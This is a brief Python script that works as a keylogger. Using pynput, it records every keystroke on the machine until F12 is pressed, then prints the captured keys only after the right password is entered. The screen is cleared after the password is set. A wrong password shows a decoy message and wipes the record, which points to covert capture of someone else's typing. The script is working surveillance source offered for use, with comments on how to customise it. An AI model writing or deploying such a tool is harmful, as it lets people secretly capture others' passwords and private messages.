import pynput
import os
from pynput.keyboard import Key, Listener

#Matan Kedar 
#3/6/2020

#PRESS F12 TO PROMPT THE PASSWORD TAB. DATA IS ERASED IF THE WRONG PASSWORD IS PUT. 

print('set password:')
pw = input()
clear = lambda: os.system('cls')
clear()
data = []



def on_press(key,):
    
    # print("{0} pressed".format(key))
    data.append(key)



def on_release(key):
    #change f12 to whatever key you want to end it with
    if key == Key.f12:            
        return False
    


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



print('pw:')
inp = input()

if pw == inp:
    for u in range(0, len(data)):
        print(data[u],end=' ')

else:
    #This is the message that shows up when someone puts the wrong password. 
    #You can change it to displace something else
    print("password has not been set yet")
    #deletes the data
    length = len(data)
    for x in range(0, length):
        data[x] = ''
    




